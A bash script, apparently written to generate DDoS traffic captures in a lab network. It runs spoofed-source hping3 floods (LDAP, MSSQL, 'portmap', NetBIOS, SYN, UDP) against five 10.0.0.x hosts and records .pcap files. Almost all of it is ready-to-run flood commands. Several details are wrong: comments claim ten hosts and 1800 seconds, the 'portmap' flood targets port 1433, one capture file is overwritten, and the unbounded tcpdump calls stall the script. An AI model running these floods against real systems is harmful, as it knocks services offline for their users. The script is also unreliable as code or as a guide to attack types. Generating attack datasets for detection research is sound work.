#!/bin/bash

# Author: Thomas Roethenbaugh
# Date: 26/02/2025

# This script is used to create simulate several kinds of DDoS attacks on the network
# It simulates sending UDP packets to the LDAP port (389) to represent the 
# initial stage of a potential reflection attack or a simple UDP flood to the LDAP port

# Randomly allocate 10 host addresses for attack
host1=10.0.0.$(($RANDOM%(10-1+1)+1)) # random address between 1 and 10
host2=10.0.0.$(($RANDOM%(10-1+1)+1))
host3=10.0.0.$(($RANDOM%(10-1+1)+1)) 
host4=10.0.0.$(($RANDOM%(10-1+1)+1)) 
host5=10.0.0.$(($RANDOM%(10-1+1)+1)) 

lengthOfAttack=30 # determine how long each attack lasts in seconds (30 seconds)
interval=60 # 1 minute

# LDAP (Lightweight Directory Access Protocol) Reflection Attack
# These commands will randomly attack several hosts on the network for around
# 1800 seconds, this should overwhelm the network with multiple attacks from 
# several locatations at once
echo "LDAP reflection attack starting"

sudo timeout $lengthOfAttack hping3 -V -2 -u -p 389 --flood --rand-source -s 53 $host1 & # & gets it to run in the backround
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 389 --flood --rand-source -s 53 $host2 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 389 --flood --rand-source -s 53 $host3 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 389 --flood --rand-source -s 53 $host4 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 389 --flood --rand-source -s 53 $host5 &

# Packet capture using tcpdump in order to output the attack packets into a .pacap file
sudo tcpdump -i net0-eth0 host $host1 -w LDAPAttack1.pcap
sudo tcpdump -i net0-eth0 host $host2 -w LDAPAttack2.pcap
sudo tcpdump -i net0-eth0 host $host3 -w LDAPAttack3.pcap

echo "LDAP reflection attack test completed"

sleep $interval # time between capture

# MSSQL (Microsoft SQL Server) Reflection Attack
echo "MSSQL starting"
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 1434 --flood --rand-source -s 53 $host1 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 1434 --flood --rand-source -s 53 $host2 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 1434 --flood --rand-source -s 53 $host3 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 1434 --flood --rand-source -s 53 $host4 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 1434 --flood --rand-source -s 53 $host5 &

# Packet capture
sudo tcpdump -i net0-eth0 host $host1 -w MSSQLAttack1.pcap
sudo tcpdump -i net0-eth0 host $host2 -w MSSQLAttack2.pcap
sudo tcpdump -i net0-eth0 host $host3 -w MSSQLAttack1.pcap

echo "MSSQL test completed"

sleep $interval

# Portmap attack
echo "portmap starting"
sudo timeout $lengthOfAttack hping3 -V -2 -S -p 1433 --flood --rand-source -s 53 $host1 &
sudo timeout $lengthOfAttack hping3 -V -2 -S -p 1433 --flood --rand-source -s 53 $host2 &
sudo timeout $lengthOfAttack hping3 -V -2 -S -p 1433 --flood --rand-source -s 53 $host3 &
sudo timeout $lengthOfAttack hping3 -V -2 -S -p 1433 --flood --rand-source -s 53 $host4 &
sudo timeout $lengthOfAttack hping3 -V -2 -S -p 1433 --flood --rand-source -s 53 $host5 &

# Packet capture
sudo tcpdump -i net0-eth0 host $host1 -w PortMapttack1.pcap
sudo tcpdump -i net0-eth0 host $host2 -w PortMapttack2.pcap
sudo tcpdump -i net0-eth0 host $host3 -w PortMapttack3.pcap

echo "portmap test completed"

sleep $interval

# NetBIOS (Network Basic Input/Output System) Reflection Attack
echo "NetBIOS starting"
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 137 --flood --rand-source -s 53 $host1 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 137 --flood --rand-source -s 53 $host2 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 137 --flood --rand-source -s 53 $host3 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 137 --flood --rand-source -s 53 $host4 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 137 --flood --rand-source -s 53 $host5 &

# Packet capture
sudo tcpdump -i net0-eth0 host $host1 -w NetBIOSAttack1.pcap
sudo tcpdump -i net0-eth0 host $host2 -w NetBIOSAttack2.pcap
sudo tcpdump -i net0-eth0 host $host3 -w NetBIOSAttack3.pcap

echo "NetBIOS test completed"

sleep $interval

# SYN Flood Attack
echo "SYN Flood starting"
sudo timeout $lengthOfAttack hping3 -V -2 -S -p 80 --flood --syn --rand-source $host1 &
sudo timeout $lengthOfAttack hping3 -V -2 -S -p 80 --flood --syn --rand-source $host2 &
sudo timeout $lengthOfAttack hping3 -V -2 -S -p 80 --flood --syn --rand-source $host3 &
sudo timeout $lengthOfAttack hping3 -V -2 -S -p 80 --flood --syn --rand-source $host4 &
sudo timeout $lengthOfAttack hping3 -V -2 -S -p 80 --flood --syn --rand-source $host5 &

# Packet capture
sudo tcpdump -i net0-eth0 host $host1 -w SYNFloodAttack1.pcap
sudo tcpdump -i net0-eth0 host $host2 -w SYNFloodAttack2.pcap
sudo tcpdump -i net0-eth0 host $host3 -w SYNFloodAttack3.pcap

echo "SYN Flood test completed"

sleep $interval

# UDPLag Attack
# sending UDP packets designed to cause lag or interrupt communication
echo "UDPLag starting"
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 12345 --flood --rand-source $host1 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 12345 --flood --rand-source $host2 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 12345 --flood --rand-source $host3 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 12345 --flood --rand-source $host4 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 12345 --flood --rand-source $host5 &

# Packet capture
sudo tcpdump -i net0-eth0 host $host1 -w UDPLagAttack1.pcap
sudo tcpdump -i net0-eth0 host $host2 -w UDPLagAttack2.pcap
sudo tcpdump -i net0-eth0 host $host3 -w UDPLagAttack3.pcap

echo "UDPLag test completed"

sleep $interval

# UDP Flood Attack
# high volume of UDP packets
echo "UDP Flood starting"
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 80 --flood --rand-source $host1 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 80 --flood --rand-source $host2 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 80 --flood --rand-source $host3 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 80 --flood --rand-source $host4 &
sudo timeout $lengthOfAttack hping3 -V -2 -u -p 80 --flood --rand-source $host5 &

# Packet capture
sudo tcpdump -i net0-eth0 host $host1 -w UDPFloodAttack1.pcap
sudo tcpdump -i net0-eth0 host $host2 -w UDPFloodAttack2.pcap
sudo tcpdump -i net0-eth0 host $host3 -w UDPFloodAttack3.pcap

echo "UDP Flood test completed"
